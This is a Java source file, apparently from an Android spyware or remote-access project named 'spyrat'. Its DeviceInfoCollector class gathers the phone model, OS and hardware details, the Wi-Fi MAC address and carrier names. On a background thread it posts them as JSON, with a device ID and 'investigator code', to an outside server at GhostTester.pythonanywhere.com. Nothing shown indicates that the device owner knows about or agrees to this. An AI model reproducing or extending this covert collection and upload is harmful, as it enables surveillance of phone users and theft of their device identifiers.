package com.spyrat.investigation;

import android.content.Context;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.net.wifi.WifiManager;
import java.net.NetworkInterface;
import java.util.Collections;
import java.util.HashMap;
import java.util.Map;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

public class DeviceInfoCollector {
    
    public static Map<String, String> collectDeviceInfo(Context context) {
        Map<String, String> deviceInfo = new HashMap<>();
        
        try {
            // Device information
            deviceInfo.put("model", Build.MODEL);
            deviceInfo.put("manufacturer", Build.MANUFACTURER);
            deviceInfo.put("android_version", Build.VERSION.RELEASE);
            deviceInfo.put("sdk_version", String.valueOf(Build.VERSION.SDK_INT));
            deviceInfo.put("product", Build.PRODUCT);
            deviceInfo.put("device", Build.DEVICE);
            deviceInfo.put("board", Build.BOARD);
            deviceInfo.put("hardware", Build.HARDWARE);
            
            // Network information
            WifiManager wifiManager = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wifiManager != null) {
                String macAddress = getMacAddress();
                deviceInfo.put("mac_address", macAddress);
            }
            
            // Telephony information (without IMEI)
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (telephonyManager != null) {
                deviceInfo.put("sim_operator", telephonyManager.getSimOperatorName());
                deviceInfo.put("network_operator", telephonyManager.getNetworkOperatorName());
                // IMEI removed due to permission requirements
                deviceInfo.put("imei", "not_available");
            }
            
        } catch (Exception e) {
            deviceInfo.put("error", e.getMessage());
        }
        
        return deviceInfo;
    }
    
    public static void sendDeviceInfo(Context context, String deviceId, String investigatorCode) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Map<String, String> deviceInfo = collectDeviceInfo(context);
                    
                    URL url = new URL("https://GhostTester.pythonanywhere.com/api/investigator/data");
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("POST");
                    connection.setRequestProperty("Content-Type", "application/json; utf-8");
                    connection.setRequestProperty("Accept", "application/json");
                    connection.setDoOutput(true);
                    connection.setConnectTimeout(15000);
                    connection.setReadTimeout(15000);

                    // Create JSON payload
                    JSONObject jsonPayload = new JSONObject();
                    jsonPayload.put("device_id", deviceId);
                    jsonPayload.put("investigator_code", investigatorCode);
                    
                    // Add device info to payload
                    JSONObject deviceInfoJson = new JSONObject();
                    for (Map.Entry<String, String> entry : deviceInfo.entrySet()) {
                        deviceInfoJson.put(entry.getKey(), entry.getValue());
                    }
                    jsonPayload.put("device_info", deviceInfoJson);

                    // Send request
                    OutputStream os = connection.getOutputStream();
                    os.write(jsonPayload.toString().getBytes("utf-8"));
                    os.flush();
                    os.close();

                    // Get response
                    int responseCode = connection.getResponseCode();
                    if (responseCode == 200) {
                        System.out.println("✅ Device info sent successfully");
                    } else {
                        System.out.println("❌ Failed to send device info: " + responseCode);
                    }

                } catch (Exception e) {
                    System.out.println("❌ Error sending device info: " + e.getMessage());
                }
            }
        }).start();
    }
    
    private static String getMacAddress() {
        try {
            for (NetworkInterface networkInterface : Collections.list(NetworkInterface.getNetworkInterfaces())) {
                if (networkInterface.getName().equalsIgnoreCase("wlan0")) {
                    byte[] macBytes = networkInterface.getHardwareAddress();
                    if (macBytes == null) {
                        return "";
                    }
                    StringBuilder res1 = new StringBuilder();
                    for (byte b : macBytes) {
                        res1.append(String.format("%02X:", b));
                    }
                    if (res1.length() > 0) {
                        res1.deleteCharAt(res1.length() - 1);
                    }
                    return res1.toString();
                }
            }
        } catch (Exception e) {
            // Ignore
        }
        return "not_available";
    }
}
